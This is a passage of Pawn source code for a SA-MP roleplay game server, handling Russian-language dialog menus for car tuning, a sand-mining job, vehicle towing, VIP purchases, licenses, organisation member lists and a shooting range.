				    if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 483 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 534 ||
				    GetVehicleModel(GetPlayerVehicleID(playerid)) == 535 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 536 ||
				    GetVehicleModel(GetPlayerVehicleID(playerid)) == 558 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 559 ||
				    GetVehicleModel(GetPlayerVehicleID(playerid)) == 560 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 561 ||
				    GetVehicleModel(GetPlayerVehicleID(playerid)) == 562 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 565 ||
				    GetVehicleModel(GetPlayerVehicleID(playerid)) == 567 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 575 ||
				    GetVehicleModel(GetPlayerVehicleID(playerid)) == 576)
				    {
				        ShowPlayerDialog(playerid,269,DIALOG_STYLE_LIST,"Винил","{FFFFFF}Винил №1\nВинил №2\nВинил №3\nУбрать винил","Далее","Назад");
				    }
				    else
					{
					   // ShowTuning(playerid);
						SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
					}
					
				}
				case 2:
				{
    				SetPlayerCameraPos(playerid,1.435253,-10.571840,1999.709594);
					SetPlayerCameraLookAt(playerid,1.078467,-9.642129,1999.618286);
					ShowPlayerDialog(playerid,270,DIALOG_STYLE_LIST,"Диски","Shadow\nMega\nRimshine\nWires\nClassic\nTwist\nCutter\nSwitch\nImport\nDollar\nTrance\nAtomic","Далее","Назад");
				}
				case 3:
				{

					ShowPlayerDialog(playerid,271,DIALOG_STYLE_LIST,"Азот","{FFFFFF}Азот x2\nАзот x5\nАзот x10","Далее","Назад");
				}
				case 4:
				{
				    if(GetVehicleComponentInSlot(GetPlayerVehicleID(playerid), CARMODTYPE_HYDRAULICS)) ShowPlayerDialog(playerid,132,DIALOG_STYLE_MSGBOX,"Гидравлика","{FFFFFF}Вы действительно хотите удалить гидравкику?\nЦена: $6500","Да","Нет");
				    else
					{
						SetPVarInt(playerid,"STODet",1087);
					    SetPlayerCameraPos(playerid,4.518465,-9.361727,2000.909545);
						SetPlayerCameraLookAt(playerid,3.686950,-8.842035,2000.713378);
						AddVehicleComponent(GetPlayerVehicleID(playerid), GetPVarInt(playerid,"STODet"));
						SetPVarInt(playerid,"STOPrice",15000);
						ShowPlayerDialog(playerid,128,DIALOG_STYLE_MSGBOX,"Гидравлика","{FFFFFF}Вы хотите установить данную деталь?\nЦена: $15000","Да","Нет");
					}
				}
				case 5:
				{

				
					SetPlayerCameraPos(playerid,-4.162179,-10.922677,2001.509399);
					SetPlayerCameraLookAt(playerid,-3.623628,-10.153695,2001.164916);
					ShowPlayerDialog(playerid,315 , DIALOG_STYLE_LIST, "Капот", "Fury\nChamp\nRace\nWorx", "Далее", "Отмена");
				}
				case 6:
				{
				    SetPlayerCameraPos(playerid,-4.162179,-10.922677,2001.509399);
					SetPlayerCameraLookAt(playerid,-3.623628,-10.153695,2001.164916);
					ShowPlayerDialog(playerid, 316, DIALOG_STYLE_LIST, "Вентиляция", "Овальная\nКвадратная", "Далее", "Отмена");
				}
				case 7:
				{
					SetPlayerCameraPos(playerid,-4.559348,-11.570341,2000.309082);
					SetPlayerCameraLookAt(playerid,-4.037294,-10.735049,2000.136596);
					ShowPlayerDialog(playerid, 318, DIALOG_STYLE_LIST, "Фары", "Круглые\nКвадратные", "Далее", "Отмена");
				}
				case 8:
				{
					SetPlayerCameraPos(playerid,1.784677,-0.547623,1999.708984);
					SetPlayerCameraLookAt(playerid,1.249547,-1.387441,1999.617675);
					ShowPlayerDialog(playerid, 319, DIALOG_STYLE_LIST, "Выхлоп", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow Co. Chromer\nLow Co. Slamin\nTransfender Large\nTransfender Medium\nTransfender Small\nTransfender Twin\nTransfender Upswept", "Далее", "Отмена");
				}
				case 9:
				{
				    SetPlayerCameraPos(playerid,-4.162179,-10.922677,2001.509399);
					SetPlayerCameraLookAt(playerid,-3.623628,-10.153695,2001.164916);
					ShowPlayerDialog(playerid, 320, DIALOG_STYLE_LIST, "Крыша", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow Co. Hardtop Roof\nLow Co. Softtop Roof\nTransfender Roof Scoop", "Далее", "Отмена");
				}
				case 10:
				{
				    SetPlayerCameraPos(playerid,-4.559348,-11.570341,2000.309082);
					SetPlayerCameraLookAt(playerid,-4.037294,-10.735049,2000.136596);
					ShowPlayerDialog(playerid, 321, DIALOG_STYLE_LIST,"Передний бампер", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow co. Chromer\nLow co. Slamin", "Далее", "Отмена");
				}
				case 11:
				{
				    SetPlayerCameraPos(playerid,1.784677,-0.547623,1999.708984);
					SetPlayerCameraLookAt(playerid,1.249547,-1.387441,1999.617675);
					ShowPlayerDialog(playerid, 322, DIALOG_STYLE_LIST, "Задний бампер", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow Co. Chromer\nLow Co. Slamin", "Далее", "Отмена");
				}
				case 12:
				{
					SetPlayerCameraPos(playerid,-5.413143,-6.330190,1999.708862);
					SetPlayerCameraLookAt(playerid,-4.498555,-5.960769,1999.544433);
					ShowPlayerDialog(playerid, 323, DIALOG_STYLE_LIST, "Боковые юбки", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLocos Chrome Strip\nLocos Chrome Flames\nLocos Chrome Arches \nLocos Chrome Trim\nLocos Wheelcovers\nTransfender", "Далее", "Отмена");
				}
				case 13:
				{
				    SetPlayerCameraPos(playerid,-5.088845,-5.191387,2001.108764);
					SetPlayerCameraLookAt(playerid,-4.151325,-4.957726,2000.850952);
					ShowPlayerDialog(playerid, 325, DIALOG_STYLE_LIST, "Спойлер", "Wheel Arc. Alien\nWheel Arc. X-Flow\nTransfender Win\nTransfender Fury\nTransfender Alpha\nTransfender Pro\nTransfender Champ\nTransfender Drag", "Далее", "Отмена");
				}
				case 14:
				{
					SetPlayerCameraPos(playerid,-4.559348,-11.570341,2000.309082);
					SetPlayerCameraLookAt(playerid,-4.037294,-10.735049,2000.136596);
					ShowPlayerDialog(playerid, 324, DIALOG_STYLE_LIST, "Решетки", "Locos Chrome Grill\nLocos Chrome Bars\nLocos Chrome Lights \nLocos Chrome Bullbar", "Далее", "Отмена");
				}
				case 15:
				{
				    if(VInfo[GetPVarInt(playerid,"Car")][vsis])
				    {
				        //ShowTuning(playerid);
				        return SendClientMessage(playerid,CGREY,"У Вас уже установлена данная деталь!");
				    }
					ShowPlayerDialog(playerid,425,DIALOG_STYLE_MSGBOX,"Система безопасности","{FFFFFF}Вы хотите установить улучшенную систему безопасности?\nЦена: $30000","Да","Нет");
				}
				case 16:
				{
				    new carid = GetPlayerVehicleID(playerid);
				    SetVehiclePos(carid,2309.8481,1795.1025,10.8203);
					SetVehicleZAngle(carid,-349.5503);
					LinkVehicleToInterior(carid,0);
					SetVehicleVirtualWorld(carid,0);
					SetPlayerVirtualWorld(playerid,0);
					SetPlayerInterior(playerid,0);
					PutPlayerInVehicle(playerid,carid,0);
				    DeletePVar(playerid,"STO");
					DeletePVar(playerid,"ATune");
					TogglePlayerControllable(playerid, 1);
					SetCameraBehindPlayer(playerid);
					CancelSelectTextDraw(playerid);
				}

		    }
		}
		case 269:
		{
		    if(!response) return 1;
		    if(listitem < 3)
		    {
		        ChangeVehiclePaintjob(GetPlayerVehicleID(playerid), listitem);
				SetPVarInt(playerid,"STODet",listitem);
				SetPVarInt(playerid,"STOPrice",4000);
				ShowPlayerDialog(playerid,129,DIALOG_STYLE_MSGBOX,"Винил","{FFFFFF}Вы хотите установить данный винил?\nЦена: $4000","Да","Нет");
		    }
		    else ChangeVehiclePaintjob(GetPlayerVehicleID(playerid), 3),ShowTuning(playerid);
		}
		case 270:
		{
		    if(!response) return 1;
			SetPVarInt(playerid,"STODet",1073+listitem);
			AddVehicleComponent(GetPlayerVehicleID(playerid), GetPVarInt(playerid,"STODet"));
			SetPVarInt(playerid,"STOPrice",5000);
			ShowPlayerDialog(playerid,128,DIALOG_STYLE_MSGBOX,"Диски","{FFFFFF}Вы хотите установить данную деталь?\nЦена: $5000","Да","Нет");
		}
		case 271:
		{
		    if(!response) return 1;
			switch(listitem)
			{
			    case 0:
				{
					SetPVarInt(playerid,"STODet",1009);
					SetPVarInt(playerid,"STOPrice",5000);
					ShowPlayerDialog(playerid,128,DIALOG_STYLE_MSGBOX,"Азот x2","{FFFFFF}Вы хотите установить данную деталь?\nЦена: $5000","Да","Нет");
				}
				case 1:
				{
				    SetPVarInt(playerid,"STODet",1008);
					SetPVarInt(playerid,"STOPrice",8000);
					ShowPlayerDialog(playerid,128,DIALOG_STYLE_MSGBOX,"Азот x5","{FFFFFF}Вы хотите установить данную деталь?\nЦена: $8000","Да","Нет");
				}
			    case 2:
			    {
				    SetPVarInt(playerid,"STODet",1010);
					SetPVarInt(playerid,"STOPrice",10000);
					ShowPlayerDialog(playerid,128,DIALOG_STYLE_MSGBOX,"Азот x10","{FFFFFF}Вы хотите установить данную деталь?\nЦена: $10000","Да","Нет");
				}
			}
			AddVehicleComponent(GetPlayerVehicleID(playerid), GetPVarInt(playerid,"STODet"));
		  		
				
		}
		case 272:
		{
		    if(!response) return true;
		    switch(GetPVarInt(playerid,"Pes"))
		    {
		        case 0:
		        {
					if(GetPVarInt(playerid,"Povar") > 0)
					{
						DeletePVar(playerid,"Povar");
						DeletePVar(playerid,"PovarW");
						DisablePlayerCheckpoint(playerid);
						DeletePVar(playerid,"PovarC");
						DeletePVar(playerid,"PovarM");
						if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
						if(IsValidDynamicObject(GetPVarInt(playerid,"PovarObject"))) DestroyDynamicObject(GetPVarInt(playerid,"PovarObject")),DeletePVar(playerid,"PovarObject");
						DeletePVar(playerid,"PovarEda");
					}
		            SetPVarInt(playerid,"Pes",1);
		            SetPVarInt(playerid,"PesC",0);
		            SetPVarInt(playerid,"PesW",1);
 					ApplyDynamicActorAnimation(BotPes,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
					Update3DTextLabelTextEx(TextPes,-1,"Держи форму и быстро за работу!");
					SetTimerEx("ClearBotGlobalClear", 3000, false,"dd",BotPes,_:TextPes);
		            SendClientMessage(playerid,CGREEN,"Вы начали работу по добыче песка. Ваша задача: добывать песок и относить на конвейер.");
		            SetPlayerAttachedObject(playerid, 1, 337, 6, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.00, 1.000000);
		            new check,picka;
		            switch(random(8))
					{

					    case 0: check = CreateDynamicCP(-1326.5011,2720.1338,52.4785, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1326.5011,2720.1338,52.4785, 0, 0, playerid, 100.0);
						case 1: check = CreateDynamicCP(-1327.5321,2726.7690,57.4201, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1327.5321,2726.7690,57.4201, 0, 0, playerid, 100.0);
						case 2: check = CreateDynamicCP(-1339.5184,2716.8699,57.5608, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1339.5184,2716.8699,57.5608, 0, 0, playerid, 100.0);
						case 3: check = CreateDynamicCP(-1331.4587,2705.1772,54.6513, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1331.4587,2705.1772,54.6513, 0, 0, playerid, 100.0);
						case 4: check = CreateDynamicCP(-1346.6035,2731.0549,56.3454, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1346.6035,2731.0549,56.3454, 0, 0, playerid, 100.0);
						case 5: check = CreateDynamicCP(-1341.8770,2754.1526,60.3163, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1341.8770,2754.1526,60.3163, 0, 0, playerid, 100.0);
						case 6: check = CreateDynamicCP(-1331.9568,2748.6819,59.9250, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1331.9568,2748.6819,59.9250, 0, 0, playerid, 100.0);
						case 7: check = CreateDynamicCP(-1359.0675,2726.4775,57.1666, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1359.0675,2726.4775,57.1666, 0, 0, playerid, 100.0);
					}
					SetPVarInt(playerid,"PesCheck",check);
					SetPVarInt(playerid,"PesPick",picka);
		            SetKaska(playerid);
		        }
		        case 1:
		        {
           			static const fmt_string1[] = "Вы закончили работу по добыче песка. Вы перенесли %i мешков и заработали $%i";
					new str1[sizeof(fmt_string1)+4+4];
					format(str1, sizeof(str1), fmt_string1,GetPVarInt(playerid,"PesC"),GetPVarInt(playerid,"PesC")*2);
					SendClientMessage(playerid,CGREEN,str1);
					GiveMoney(playerid,GetPVarInt(playerid,"PesC")*100);
					if(!PlayerInfo[playerid][pQuestS][1])
					{
						PlayerQuest[playerid][1][0] += GetPVarInt(playerid,"PesC");
						CheckQuest(playerid,1);
					}
     				DeletePVar(playerid,"Pes");
					if(IsValidDynamicCP(GetPVarInt(playerid,"PesCheck"))) DestroyDynamicCP(GetPVarInt(playerid,"PesCheck")),DeletePVar(playerid,"PesCheck");
     				if(IsValidDynamicPickup(GetPVarInt(playerid,"PesPick"))) DestroyDynamicPickup(GetPVarInt(playerid,"PesPick")),DeletePVar(playerid,"PesPick");
		            DeletePVar(playerid,"PesW");
		            DisablePlayerCheckpoint(playerid);
					SetPlayerSpecialAction(playerid,0);
					if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
					static const fmt_str1[] = "Хорошая работа. Держи свои $%i";
					new string1[sizeof(fmt_str1)+10];
					format(string1, sizeof(string1), fmt_str1, GetPVarInt(playerid,"PesC")*2);
					ApplyDynamicActorAnimation(BotPes,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
					Update3DTextLabelTextEx(TextPes,-1,string1);
					SetTimerEx("ClearBotGlobalClear", 3000, false,"dd",BotPes,_:TextPes);
     				DeletePVar(playerid,"PesW");
					if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5);
					CheckJobHelp(playerid);
		        }
		    }
		}
		case 273:
		{
  			if(!response) return true;
			static const fmt_string[] = "%s";
			new str[sizeof(fmt_string)+64];
			format(str, sizeof(str), fmt_string,VehicleNameS[VInfo[ListNick[playerid][listitem]][vmodel]-400]);
			SetPVarInt(playerid,"MyCar1",ListNick[playerid][listitem]);
   			ShowPlayerDialog(playerid,274,DIALOG_STYLE_MSGBOX,str,"{FFFFFF}Вы действительно хотите отбуксировать данный транспорт?\nЦена: 2000$","Создать","Назад");
		}
		case 274:
		{
  			if(!response) return DeletePVar(playerid,"MyCar1");
			if(PlayerInfo[playerid][pCash] < 2000)
			{
			    SendClientMessage(playerid,CGREY,"Недостаточно средств");
			    return DeletePVar(playerid,"MyCar1");
			}
			new k = GetPVarInt(playerid,"MyCar1");
			GiveMoney(playerid,-2000);
			switch(random(3))
			{
				case 0: SetVehiclePos(VInfo[k][vcar],1649.2876,2195.8259,10.5018);
				case 1: SetVehiclePos(VInfo[k][vcar],1643.1788,2195.9929,10.5018);
				case 2: SetVehiclePos(VInfo[k][vcar],1637.5524,2196.9951,10.5018);
			}
			SetVehicleVirtualWorld(VInfo[k][vcar],0);
		 	LinkVehicleToInterior(VInfo[k][vcar], 0);
		    IsLocked[VInfo[k][vcar]] = true;
           	CarDoors(VInfo[k][vcar],1);
           	PutPlayerInVehicle(playerid,VInfo[k][vcar],0);
           	SetVehicleZAngle(VInfo[k][vcar] ,171.0);
           	SetVehicleZAngle(GetPlayerVehicleID(playerid) ,171.0);
           	ApplyDynamicActorAnimation(BursirBot,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			Update3DTextLabelTextEx(BursirText,-1,"Готово! Вот ваша ласточка");
			SetTimerEx("ClearBotGlobal", 3000, false,"ii",BursirBot,_:BursirText);
           	DeletePVar(playerid,"MyCar1");
			
		}
//		case 275: cmd_quest(playerid);
		case 276:
		{
		    if(!response) return true;
            if(PlayerInfo[playerid][pVip] > gettime()) return SendClientMessage(playerid,CREWARD,"У Вас уже есть VIP");
            if(PlayerInfo[playerid][pDonate] < 250)
            {
               	SendClientMessage(playerid,CGREY,"Недостаточно доната на счету");
               	cmd_menu(playerid,"");
                return true;
            }
            PlayerInfo[playerid][pDonate] -= 250;
			if(PlayerInfo[playerid][pVip] > gettime())
			{
				new heh = PlayerInfo[playerid][pVip] - gettime();
	            PlayerInfo[playerid][pVip] = heh + 60*60*24*30;
            }
            else PlayerInfo[playerid][pVip] = gettime() + 60*60*24*30;
			SendClientMessage(playerid,CREWARD,"Вы получили 30 дней к VIP.");
		}
		case 277:
		{
		    if(!response) return true;
		    new nick;
		    if(sscanf(inputtext,"i",nick) || nick < 1 || nick > 311 || nick == 74 || nick ==5) return ShowPlayerDialog(playerid,277,DIALOG_STYLE_INPUT,"Введите ID скина","{FFFFFF}Введите ID желаемого скина, который вы хотите получить:","Далее","Отмена");
		    PlayerInfo[playerid][pModel] = nick;
		    SetSkin(playerid);
		}
		case 278:
		{
			if(!response)
			{
			    DeletePVar(playerid,"InfoMem");
			    return DeletePVar(playerid,"CheckPlayer");
			}
			query = "";
			new trx[10],check = 0,kol2 = GetPVarInt(playerid,"CheckPlayer")+1;
			DeletePVar(playerid,"CheckPlayer");
			for(new i = kol2 ; i < MAX_PLAYERS; i++)
			{
			    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
		        if(PlayerInfo[i][pMember] == PlayerInfo[playerid][pMember])
		        {
		            new str1[50];
					if(GetPVarInt(i, "AFK_Time") > 1) format(str1,sizeof(str1),", АФК: %i сек",GetPVarInt(i,"AFK_Time"));
					else str1 = "";
					if(IsAMafia(i) || IsAGang(i))
					{
						static const fmt_string[] = "%s[%i]: Ранг: %i | Должность: %s%s\n";
						new str[sizeof(fmt_string)+2+MAX_PLAYER_NAME+4+2+32];
						format(str, sizeof(str), fmt_string,PlayerInfo[i][pSendername],i,PlayerInfo[i][pRank],FracRank[PlayerInfo[i][pMember]][PlayerInfo[i][pRank]],str1);
						strcat(query,str);
					}
					else
					{
						if(PlayerInfo[i][pWork] == 0) trx = "{AFAFAF}";
						else trx = "{FFFFFF}";
						static const fmt_string[] = "%s%s[%i]: Ранг: %i | Должность: %s%s\n";
						new str[sizeof(fmt_string)+2+MAX_PLAYER_NAME+4+2+32+10];
						format(str, sizeof(str), fmt_string,trx,PlayerInfo[i][pSendername],i,PlayerInfo[i][pRank],FracRank[PlayerInfo[i][pMember]][PlayerInfo[i][pRank]],str1);
						strcat(query,str);

					}
					check++;
					if(check >= 15)
					{
						SetPVarInt(playerid,"CheckPlayer",i);
						break;
					}
				}
			}
			static const fmt_string1[] = "Состав организации онлайн %i человек";
			new str1[sizeof(fmt_string1)+3];
			format(str1, sizeof(str1), fmt_string1,GetPVarInt(playerid,"InfoMem"));
			if(!GetPVarInt(playerid,"CheckPlayer")) ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,str1,query,"Назад","");
			else ShowPlayerDialog(playerid,278,DIALOG_STYLE_MSGBOX,str1,query,"Далее","Назад");
		}
		case 279:
		{
		    if(!response)
			{
			    return DeletePVar(playerid,"CheckPlayer");
			}
			query = "";
			format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE member = '%d' AND id > '%d'", PlayerInfo[playerid][pMember],GetPVarInt(playerid,"CheckPlayer"));
			mysql_tquery(mysql, query, "OffMemberShow", "d", playerid);
  		/*	format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE member = '%d' AND id > '%d'", PlayerInfo[playerid][pMember],GetPVarInt(playerid,"CheckPlayer"));
			mysql_tquery(mysql,query);
			mysql_store_result();
			new srrt[1500];
			new war1[30],reg[6],sos[32],sos1[5],check,sos22[5];
			DeletePVar(playerid,"CheckPlayer");
		    if(mysql_num_rows() > 0)
		    {
				for(new i = 1; i <= mysql_num_rows();i++)
				{
					mysql_fetch_row(query);
					mysql_get_field("name", sos);
					mysql_get_field("rank", sos1);
					if(GetPlayerID(sos) != INVALID_PLAYER_ID)
					{
						new str[100];
						format(str,sizeof(str),"{FFFFFF}%s: Ранг: %d | Должность: %s | {3caa3c}Online\n",sos,strval(sos1),FracRank[PlayerInfo[playerid][pMember]][strval(sos1)]);
						strcat(srrt, str);
					}
					else
					{
						mysql_get_field("reg", war1);
						sscanf(war1, "p<,>a<i>[5]",reg);
						new str[100];
						format(str,sizeof(str),"{FFFFFF}%s: Ранг: %d | Должность: %s | Последний заход: %02d/%02d/%02d %02d:%02d:%02d\n",sos,strval(sos1),FracRank[PlayerInfo[playerid][pMember]][strval(sos1)],reg[0],reg[1],reg[2],reg[3],reg[4],reg[5]);
						strcat(srrt, str);
					}
					check++;
					if(check >= 15)
					{
					    mysql_get_field("id", sos22);
					    SetPVarInt(playerid,"CheckPlayer",strval(sos22));
					    break;
					}
				}
	   			mysql_free_result();
	   			SetPVarInt(playerid,"AntiFlood1",gettime() + 3);
				if(!GetPVarInt(playerid,"CheckPlayer")) ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Состав организации",srrt,"Назад","");
				else ShowPlayerDialog(playerid,279,DIALOG_STYLE_MSGBOX,"Состав организации",srrt,"Далее","Назад");
		    }*/
		}
		case 281:
		{
		    if(!response) return 1;
			query = "";
			strcat(query,"{FFFFFF}/anim – Список анимаций\n\n/time – Узнать время\n\n/showbadge - Показать удостоверение\n\n/phone - Открыть телефон");
			strcat(query,"\n\n/news - Последние новости\n\n/join - Информация о наборах в организации");
			ShowPlayerDialog(playerid,23,DIALOG_STYLE_MSGBOX,"Прочее",query,"Назад","");
		}
		case 282:
		{
		    if(!response) return 1;
		    SetPVarInt(playerid,"LicListitem",listitem);
		    switch(listitem)
		    {
		        case 0: ShowPlayerDialog(playerid,283,DIALOG_STYLE_MSGBOX,"Лицензия на машины","{FFFFFF}Вы действительно хотите приобрести лицензию на машины?\nЦена: $1000","Да","Нет");
		        case 1: ShowPlayerDialog(playerid,283,DIALOG_STYLE_MSGBOX,"Лицензия на мото транспорт","{FFFFFF}Вы действительно хотите приобрести лицензию на мото транспорт?\nЦена: $5000","Да","Нет");
		        case 2: ShowPlayerDialog(playerid,283,DIALOG_STYLE_MSGBOX,"Лицензия на водный транспорт","{FFFFFF}Вы действительно хотите приобрести лицензию на водный транспорт?\nЦена: $10000","Да","Нет");
		        case 3: ShowPlayerDialog(playerid,283,DIALOG_STYLE_MSGBOX,"Лицензия на воздушный транспорт","{FFFFFF}Вы действительно хотите приобрести лицензию на воздушный транспорт?\nЦена: $15000","Да","Нет");
				case 4: ShowPlayerDialog(playerid,283,DIALOG_STYLE_MSGBOX,"Лицензия на оружие","{FFFFFF}Вы действительно хотите приобрести лицензию на оружие?\nЦена: $10000","Да","Нет");
		    }
		}
		case 283:
		{
		    if(!response) return DeletePVar(playerid,"LicListitem");
		    new cena = 0;
			switch(GetPVarInt(playerid,"LicListitem"))
			{
				case 0: cena = 1000;
				case 1: cena = 5000;
				case 2: cena = 10000;
				case 3: cena = 15000;
				case 4: cena = 10000;
			}
			if(PlayerInfo[playerid][pCash] < cena) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
			if(PlayerInfo[playerid][pLic][GetPVarInt(playerid,"LicListitem")]) return SendClientMessage(playerid,CGREY,"У Вас уже есть данная лицензия");
			PlayerInfo[playerid][pLic][GetPVarInt(playerid,"LicListitem")] = 1;
			PlayerInfo[playerid][pLicTime][GetPVarInt(playerid,"LicListitem")] = gettime()+60*60*24*90;
			GiveInv(playerid,449,1);
			GiveMoney(playerid,-cena);
			DeletePVar(playerid,"LicListitem");
		}
		case 284:
		{
		    if(!response) return true;
		    if(StartRegGG == 0) return SendClientMessage(playerid,CGREY,"Регистрация закрыта");
		    if(GetPVarInt(playerid,"GGReg") > 0) return SendClientMessage(playerid,CGREY,"Вы уже зарегистрированы");
		    if(PlayerInfo[playerid][pCash] < 50) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
		    GiveMoney(playerid,-50);
			SetPVarInt(playerid,"GGReg",1);
			SendClientMessage(playerid,CYELLOW,"Вы зарегистрировались");
   			if(GetOnlineGG() == 14) StartGG();
		}
		case 285:
		{
			if(!response) return 1;
	  		if(!GetPVarInt(playerid,"Oplata"))
      		{
		  		if(PlayerInfo[playerid][pCash] < 500) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
			}
			else
			{
			    if(PlayerInfo[playerid][pBank] < 500) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
			}
	  		if(PlayerInfo[playerid][pGunSkill][listitem] >= 1000) return SendClientMessage(playerid,CGREY,"Умения стрельбы для данного оружия у вас уже прокачен");
	  		SetPVarInt(playerid,"AmmoV",GetPlayerVirtualWorld(playerid));
	  		ResetPlayerWeapons(playerid);
	  		if(listitem == 0 ||listitem == 1 || listitem == 2) GivePlayerWeapon(playerid,listitem+23,9999);
	  		if(listitem == 3 ||listitem == 4 || listitem == 5) GivePlayerWeapon(playerid,listitem+26,9999);
			if(!GetPVarInt(playerid,"Oplata")) GiveMoney(playerid, -GetCena(GetPVarInt(playerid,"PBIZ"),500));
			else PlayerInfo[playerid][pBank] -= GetCena(GetPVarInt(playerid,"PBIZ"),500);
			
			BizMinus(GetPVarInt(playerid,"PBIZ"),GetCena(GetPVarInt(playerid,"PBIZ"),500),50);
			SetPlayerVirtualWorld(playerid, playerid+4);
			SetPlayerPos(playerid,303.0366,-64.1272,1001.5156);
			SetPlayerFacingAngle(playerid,267.9994);
		    shot__player[playerid] = 0;
		    levelammo[playerid] = 2;
		    SetPVarInt(playerid,"Tir",1);
		    SetPVarInt(playerid,"short__shop",1);
			ShowInfo(playerid,"press to exit H");
			new object0 = CreateDynamicObject(1586, 309.94650, -57.21810, 1000.51208, 0.00000, 0.00000, 270.00000, playerid+4, 4);
			new object1 = CreateDynamicObject(1586,  312.59146, -70.85304, 1000.51208, 0.00000, 0.00000, 270.00000, playerid+4, 4);
			SetPVarInt(playerid,"ObjectTir1",object0);
			SetPVarInt(playerid,"ObjectTir2",object1);
			MoveDynamicObject(object0, 309.94650, -70.87310, 1000.51208, 2);
			MoveDynamicObject(object1, 312.59149, -57.24220, 1000.51208, 2);
			Streamer_AppendArrayData(STREAMER_TYPE_OBJECT, object0, E_STREAMER_EXTRA_ID, -2);
			Streamer_AppendArrayData(STREAMER_TYPE_OBJECT, object0, E_STREAMER_EXTRA_ID, playerid);
			Streamer_AppendArrayData(STREAMER_TYPE_OBJECT, object0, E_STREAMER_EXTRA_ID, 1);
			Streamer_AppendArrayData(STREAMER_TYPE_OBJECT, object1, E_STREAMER_EXTRA_ID, -2);
			Streamer_AppendArrayData(STREAMER_TYPE_OBJECT, object1, E_STREAMER_EXTRA_ID, playerid);
			Streamer_AppendArrayData(STREAMER_TYPE_OBJECT, object1, E_STREAMER_EXTRA_ID, 2);
			return 1;
		}
		case 286:
	    {
		    if(!response) return 1;
		    ShowPlayerDialog(playerid, 285, DIALOG_STYLE_LIST, "Выберите оружие", "{FFFFFF}Silenced 9mm\nDesert Eagle\nShotGun\nMP5\nAK47\nM4", "Выбрать", "Отмена");
			return 1;
	    }
	    case 287:
		{
			if(!response || !GetPVarInt(playerid,"Lift")) return DeletePVar(playerid,"Lift");
			if(GetPVarInt(playerid,"Lift")-1 == listitem) SendClientMessage(playerid,CGREY,"Вы уже на данном этаже");
			else
			{
			    switch(listitem)
			    {
			        case 0:
			        {
			            SetPlayerPos(playerid,1445.8608,-1775.3203,33.4297);
			            SetPlayerFacingAngle(playerid,344.1188);
			            SetPlayerVirtualWorld(playerid,0);
			            SetPlayerInterior(playerid,0);
			            FreezePlayer(playerid,1445.8608,-1775.3203,0.8);

			        }
			        case 1:
			        {
			            SetPlayerPos(playerid,1403.8727,-28.2757,1000.9153);
			            SetPlayerFacingAngle(playerid,90.4932);
			            SetPlayerVirtualWorld(playerid,55);
			            SetPlayerInterior(playerid,33);
			            FreezePlayer(playerid,1403.8727,-28.2757,0.8);
			        }
			        case 2:
			        {
			            SetPlayerPos(playerid,1395.6494,-38.2981,1000.9153);
			            SetPlayerFacingAngle(playerid,90.1798);
			            SetPlayerVirtualWorld(playerid,54);
			            SetPlayerInterior(playerid,33);
			            FreezePlayer(playerid,1395.6494,-38.2981,0.8);
			        }
			        case 3:
			        {
		        		SetPlayerPos(playerid,998.7595,1089.4596,2997.4297);
			            SetPlayerFacingAngle(playerid,266.7281);
			            SetPlayerVirtualWorld(playerid,90);
			            SetPlayerInterior(playerid,4);
			            FreezePlayer(playerid,2481.4058,2257.6162,0.8);
			        }
			    }
			}
			DeletePVar(playerid,"Lift");
		}
	
		case 290:
		{
		    if(!response) return ShowPlayerDialog(playerid,46,DIALOG_STYLE_LIST,"Положить","{FFFFFF}1 | Материалы\n2 | Ящик с материалами\n3 | Наркотики\n4 | Аптечки\n5 | Оружие\n6 | Деньги","Далее","Отмена");
		    ShowPlayerDialog(playerid,298,DIALOG_STYLE_INPUT,"Взять оружие","{FFFFFF}Введите сколько хотите взять патронов:" ,"Далее","Назад");
		    SetPVarInt(playerid,"GunPol",ListNick[playerid][listitem]);
		}
		
 	
 
		
		/*case 301:
		{
		    if(!response) return ShowPlayerDialog(playerid,301,DIALOG_STYLE_INPUT,"Авторизация","{FFFFFF}Введите код высланый Вам на почту:","Готово","Отмена");
		    new krek;
		    if(sscanf(inputtext,"i",krek)) return ShowPlayerDialog(playerid,301,DIALOG_STYLE_INPUT,"Авторизация","{FFFFFF}Введите код высланый Вам на почту:","Готово","Отмена");
